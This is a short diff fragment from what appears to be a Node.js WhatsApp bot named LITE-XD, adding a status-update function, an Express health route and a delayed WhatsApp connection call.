+                attrs: {
+                    to: '@s.whatsapp.net',
+                    type: 'set',
+                    xmlns: 'status',
+                },
+                content: [
+                    {
+                        tag: 'status',
+                        attrs: {},
+                        content: Buffer.from(status, 'utf-8'),
+                    },
+                ],
+            });
+            return status;
+        };
+    conn.serializeM = mek => sms(conn, mek, store);
+  }
+  
+  app.get("/", (req, res) => {
+  res.send("LITE-XD STARTED ✅");
+  });
+  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
+  setTimeout(() => {
+  connectToWA()
+  }, 4000);
